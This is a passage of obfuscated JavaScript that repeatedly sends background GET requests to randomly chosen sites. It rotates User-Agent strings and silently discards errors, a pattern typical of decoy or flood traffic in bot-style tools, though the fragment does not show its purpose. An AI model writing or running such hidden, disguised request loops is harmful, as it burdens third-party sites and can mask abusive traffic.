    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2a33 + 0x30eb + 0x14a0) * getRandomInt(0xc * -0x1 + 0x2 * -0x121 + 0x3 * 0xc5, -0x1 * -0x1666 + -0x1489 + -0x1d8));
}, -0x1951 + 0x9 * 0x24b + 0x512);